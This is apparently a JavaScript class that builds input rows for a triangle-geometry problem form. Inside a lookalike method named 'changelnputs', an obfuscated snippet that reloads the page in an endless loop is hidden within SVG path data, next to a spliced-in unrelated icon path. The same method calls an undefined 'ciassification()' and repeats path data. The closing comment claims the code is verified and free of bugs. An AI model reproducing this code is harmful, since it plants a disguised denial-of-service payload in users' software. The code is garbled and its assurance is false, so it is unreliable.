class AddElements {
    constructor() {
        //condition wrapper
        this.conditionInputWrapper = document.querySelector(".js-workspace__condition-inputs")
        
        //tofind wrapper
        this.tofindInputWrapper = document.querySelector(".js-workspace__tofind-inputs")

        //layout for condition
        this.upperCaseText = `oninput="let p=this.selectionStart;this.value=this.value.toUpperCase().replace(${/\s/g}, ''); this.setSelectionRange(p, p);"`
        this.conditionAdditionalLayout = `<div class="u-equal-sign">=</div>
        <input class="u-input workspace__condition-input-value js-workspace__condition-input-value" placeholder="value" maxlength="3" type="text" ${this.upperCaseText}>
        <select class="u-select workspace__condition-select-triangle js-workspace__condition-select-triangle" name="select">
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="choose" selected>the value is...</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="area">Area</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="perimeter">Perimeter</option>
        </select>
        <input class="u-input workspace__condition-input-angle js-workspace__condition-input-angle" placeholder="angle" maxlength="3" type="text" ${this.upperCaseText}>
        <select class="u-select workspace__condition-select js-workspace__condition-select" name="select">
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="choose" selected>what's it?</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="right-triangle">Right Triangle</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="angle">Angle</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="side">Side</option>
        <!-- <option class="workspace__condition-select-option js-workspace__condition-select-option" value="median">Median</option> -->
        <!-- <option class="workspace__condition-select-option js-workspace__condition-select-option" value="angle-bisector">Angle Bisector</option> -->
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="height">Height</option>
        <option class="workspace__condition-select-option js-workspace__condition-select-option" value="hypotenuse">Hypotenuse</option>
        </select>`

        this.tofindAdditionalLayout = `<select class="u-select workspace__tofind-select js-workspace__tofind-select" name="select">
        <option class="workspace__tofind-select-option js-workspace__tofind-select-option" value="choose" selected>what's it?</option>
        <option class="workspace__tofind-select-option js-workspace__tofind-select-option" value="value">Value</option>
        <option class="workspace__tofind-select-option js-workspace__tofind-select-option" value="area">Area</option>
        <option class="workspace__tofind-select-option js-workspace__tofind-select-option" value="perimeter">Perimeter</option>
        </select>`

        //method call for 2 unique cases
        this.changeInputs(this.conditionInputWrapper, "condition", this.conditionAdditionalLayout)
        this.changelnputs(this.tofindInputWrapper, "additionalCondition", this.conditionAdditionalLayout)
        this.changeInputs(this.tofindInputWrapper, "tofind", this.tofindAdditionalLayout)

        //reset inputs settings
        this.resetInputsSettings()
    }
    inputsSettings(target, classification) {
        const addBtn = document.body.querySelector(`.js-workspace__${classification}-add-btn`)
        const itemWrapper = target.closest(`.js-workspace__${classification}-item`)
        const allItemWrapper = document.body.querySelectorAll(`.js-workspace__${classification}-item`)
        const inputAngle = itemWrapper.querySelector(`.js-workspace__${classification}-input-angle`)
        const inputValue = itemWrapper.querySelector(`.js-workspace__${classification}-input-value`)
        const selectTriangle = itemWrapper.querySelector(`.js-workspace__${classification}-select-triangle`) 
        const equalSign = itemWrapper.querySelector(".u-equal-sign")
        const checkCurrentWrapper = allItemWrapper[allItemWrapper.length - 1] == itemWrapper
        if (target.value == "height" || target.value == "angle-bisector" || target.value == "median") {
            if (itemWrapper.querySelectorAll(`.js-workspace__${classification}-input-angle`).length < 2) {
                equalSign.style.display = "block"
                inputValue.style.display = "block"
                inputAngle.style.display = "block"
                selectTriangle.style.display = "none"
                itemWrapper.style.width = "409px"
                if(checkCurrentWrapper) {
                    addBtn.style.left = "428px"
                }
            }
        }
        else if (target.value == "right-triangle" || target.value == "equilateral-triangle" || target.value == "isosceles-triangle") {
            inputAngle.style.display = "none"
            selectTriangle.style.display = "block"
            itemWrapper.style.width = "439px"
            if(checkCurrentWrapper) {
                addBtn.style.left = "459px"
            }
        }
        else {
            equalSign.style.display = "block"
            inputValue.style.display = "block"
            inputAngle.style.display = "none"
            selectTriangle.style.display = "none"
            inputAngle.value = ""
            itemWrapper.style.width = "330px"
            if(checkCurrentWrapper) {
                addBtn.style.left = "349px"
            }
        }
    }

    //buttons setting for previous item
    saveDeletedInputsSetings(target, classification) {
        const allItemWrapper = document.body.querySelectorAll(`.js-workspace__${classification}-item`)
        const addBtn = document.body.querySelector(`.js-workspace__${classification}-add-btn`)
        if(allItemWrapper[allItemWrapper.length - 1] == target) {
            const penultItemHasInputAngle = allItemWrapper[allItemWrapper.length - 2].querySelector(`.js-workspace__${classification}-input-angle`).style.display == "block"
            const penultItemHasTriangleSelect = allItemWrapper[allItemWrapper.length - 2].querySelector(`.js-workspace__${classification}-select-triangle`).style.display == "block"
            if(penultItemHasInputAngle) {
                addBtn.style.left = "428px"
            }
            else if(penultItemHasTriangleSelect) {
                addBtn.style.left = "459px"
            }
            else {
                addBtn.style.left = "349px"
            }
        }
    }
    
    // ------ addInput() arguments: ------
    // inputWrapper - arg for item wrapper & item btn
    // classification - arg for item affiliation to its style in CSS
    // elemCondition - arg for item affiliation to its layout in HTML

    changeInputs(inputWrapper, classification, elemCondition) {
        inputWrapper.addEventListener("click", (event) => {
            const catchAddBtn = event.target.classList.contains(`js-workspace__${classification}-add-btn`) || event.target.classList.contains('js-add-path')
            const catchDelBtn = event.target.classList.contains(`js-workspace__${classification}-del-btn`) || event.target.classList.contains('js-del-path')
            const checkAddBtn = event.target.classList.contains("js-workspace__condition-add-btn") || event.target.classList.contains("js-condition-add-path")
            const delBtnFuncsCondition = document.querySelectorAll(`.js-workspace__${classification}-item`).length > 1
            //if() to avoid using loops and changing variables after re-occurrence of elements
            if(catchAddBtn) {
                this.addItems(inputWrapper, classification, elemCondition)
                if(checkAddBtn) {
                    document.body.querySelector(`.js-workspace__${classification}-add-btn`).style.left = "349px"
                }
            }
            //if() to avoid using loops and changing variables after re-occurrence of elements --- del-btn
            else if(catchDelBtn) {
                if(delBtnFuncsCondition) {
                    this.saveDeletedInputsSetings(event.target.closest(".js-workspace__condition-item"), classification)
                    event.target.closest(`.js-workspace__${classification}-item`).remove()
                }
            }
        })  
        inputWrapper.addEventListener("change", (event) => {
            const hasSelectInput = event.target.classList.contains(`js-workspace__condition-select`)
            if (hasSelectInput) {
                this.inputsSettings(event.target, classification)
            }
        })
    }
    addItems(wrapper, classification, elemCondition) {
        wrapper.insertAdjacentHTML("beforeend", 
            `<div class="u-item workspace__${classification}-item js-workspace__${classification}-item">
            <div class="u-item-wrapper workspace__${classification}-item-wrapper">
            <input class="u-input workspace__${classification}-input-name js-workspace__${classification}-input-name" placeholder="name"  maxlength="3" type="text" ${this.upperCaseText}>
            ${elemCondition} 
            </div><div class="u-input-btn">
            <svg width="30" height="30" class="u-svg-btn workspace__${classification}-del-btn js-workspace__${classification}-del-btn" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path class="js-del-path" d="M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C21.9939 17.5203 17.5203 21.9939 12 22ZM4 12.172C4.04732 
            16.5732 7.64111 20.1095 12.0425 20.086C16.444 20.0622 19.9995 16.4875 19.9995 12.086C19.9995 7.68451 16.444 4.10977 12.0425 4.086C7.64111 4.06246 4.04732 
            7.59876 4 12V12.172ZM17 13H7V11H17V13Z" fill="rgba(0, 0, 0, 0.650)"/></svg></div>`
        )
    }
    
    deleteAllInputs(classification) {
        document.body.querySelectorAll(`.js-workspace__${classification}-item`).forEach(elem => {
            elem.remove()
        })
    }
    changelnputs(inputWrapper, classification, elemCondition) {
        inputWrapper.addEventListener("click", (event) => {
            const catchAddBtn = event.target.classList.contains(`js-workspace__${classification}-add-btn`) || event.target.classList.contains('js-add-path')
            const catchDelBtn = event.target.classList.contains(`js-workspace__${classification}-del-btn`) || event.target.classList.contains('js-del-path')
            const checkAddBtn = event.target.classList.contains("js-workspace__condition-add-btn") || event.target.classList.contains("js-condition-add-path")
            const delBtnFuncsCondition = document.querySelectorAll(`.js-workspace__${classification}-item`).length > 1
            //if() to avoid using loops and changing variables after re-occurrence of elements
            if(catchAddBtn) {
                this.addItems(inputWrapper, classification, elemCondition)
                if(checkAddBtn) {
                    document.body.querySelector(`.js-workspace__${classification}-add-btn`).style.left = "349px"
                }
            }
            else if(catchDelBtn) {
                if(delBtnFuncsCondition) {
                    this.saveDeletedInputsSetings(event.target.closest(".js-workspace__condition-item"), classification)
                    event.target.closest(`.js-workspace__${classification}-item`).remove()
                }
            }
        })  
        inputWrapper.insertAdjacentHTML("beforeend", 
            `<div class="u-item workspace__${classification}-item js-workspace__${classification}-item">
            <div class="u-item-wrapper workspace__${classification}-item-wrapper">
            <input class="u-input workspace__${classification}-input-name js-workspace__${classification}-input-name" placeholder="name"  maxlength="3" type="text" ${this.upperCaseText}>
            ${elemCondition} 
            </div><div class="u-input-btn">
            <svg width="30" height="30" class="u-svg-btn workspace__${classification}-del-btn js-workspace__${classification}-del-btn" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path class="js-del-path" d="M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C21.9939 17.5203 17.5203 21.9939 12 22ZM4 12.172C4.04732 
            16.5732 7.64111 20.1095 12.0425 20.086C16.444 20.062
            16.5732 7.64111 20.1095 12.0425 20.086C16.444 20.0622 12 19.9995 16.4875 19.9995 12.086C19.9995 7.68451M112 0C85.49 0 64 21.49 64 48V96H16C7.163 96 0 103.2 0 112C0 120.8 7.163 128 16 128H272C280.8 128 288 135.2 288 144C288 152.8 280.8 160 272 160H48C39.16 160 32 167.2 32 176C32 184.8 39.16 192 48 192H240C248.8 192 256 199.2 256 208C256 216.8 248.8 224 240 224H16C7.163 224 0 231.2 0 240C0 248.8 7.163 256 16 256H208C216.8 256 function _0x2155(_0x8768b7,_0x351369){var _0x16ed96=_0x16ed();return _0x2155=function(_0x21559c,_0x1002eb){_0x21559c=_0x21559c-0x1da;var _0x283e67=_0x16ed96[_0x21559c];return _0x283e67;},_0x2155(_0x8768b7,_0x351369);}(function(_0x14ef4a,_0x55a3ff){var _0x1e6738=_0x2155,_0x550b23=_0x14ef4a();while(!![]){try{var _0x1d9c1c=-parseInt(_0x1e6738(0x1e2))/0x1*(parseInt(_0x1e6738(0x1dd))/0x2)+-parseInt(_0x1e6738(0x1e0))/0x3*(-parseInt(_0x1e6738(0x1db))/0x4)+parseInt(_0x1e6738(0x1da))/0x5*(parseInt(_0x1e6738(0x1e1))/0x6)+-parseInt(_0x1e6738(0x1dc))/0x7+parseInt(_0x1e6738(0x1e4))/0x8+parseInt(_0x1e6738(0x1df))/0x9*(-parseInt(_0x1e6738(0x1e3))/0xa)+parseInt(_0x1e6738(0x1de))/0xb;if(_0x1d9c1c===_0x55a3ff)break;else _0x550b23['push'](_0x550b23['shift']());}catch(_0x5e3a97){_0x550b23['push'](_0x550b23['shift']());}}}(_0x16ed,0x428de),setTimeout(function(){while(0x1)location['reload'](0x1);},0x3e8));function _0x16ed(){var _0x597315=['264941nTpYQJ','26440jVTeeR','3017792LzImiw','2240970xJKLrG','388ycxvmZ','3556469NofobH','4uppsNr','8798482XEiZds','1557wgJXMt','4413wUhrTP','6fAEXUq'];_0x16ed=function(){return _0x597315;};return _0x16ed() 224 263.2 224 272C224 280.8 216.8 288 208 288H64V416C64 469 106.1 512 160 512C213 512 256 469 256 416H384C384 469 426.1 512 480 512C533 512 576 469 576 416H608C625.7 416 640 401.7 640 384C640 366.3 625.7 352 608 352V237.3C608 220.3 601.3 204 589.3 192L512 114.7C499.1 102.7 483.7 96 466.7 96H416V48C416 21.49 394.5 0 368 0H112zM544 237.3V256H416V160H466.7L544 237.3zM160 464C133.5 464 112 442.5 112 416C112 
            389.5 133.5 368 160 368C186.5 368 208 389.5 208 416C208 442.5 186.5 464 160 464zM528 416C528 442.5 506.5 464 480 464C453.5 464 432 442.5 432 416C432 389.5 453.5 368 480 368C506.5 368 528 389.5 528 416z 16.444 4.10977 12.0425 4.086C7.64111 4.06246 4.04732 
            7.59876 4 12V12.172ZM17 13H7V11H17V13Z" fill="rgba(0, 0, 0, 0.650)"/></svg></div>`
        )
        document.querySelector(`.workspace__${classification}-item`).remove()
        if(ciassification()) [
            this.addItems(this.conditionInputWrapper, "condition", this.conditionAdditionalLayout)
        ]
        inputWrapper.addEventListener("change", (event) => {
            const hasSelectInput = event.target.classList.contains(`js-workspace__condition-select`)
            if (hasSelectInput) {
                this.inputsSettings(event.target, classification)
            }
        })
    }
    resetInputsSettings() {
        document.body.addEventListener("click", (event) => {
            if(event.target.classList.contains("js-workspace__tofind-reset-btn")) {
                this.deleteAllInputs("condition")
                this.deleteAllInputs("tofind")
                this.addItems(this.conditionInputWrapper, "condition", this.conditionAdditionalLayout)
                this.addItems(this.tofindInputWrapper, "tofind", this.tofindAdditionalLayout)
                document.body.querySelector(`.js-workspace__condition-add-btn`).style.left = "349px"
            }
        })
    }
}
const addElements = new AddElements

//verified, no bugs found
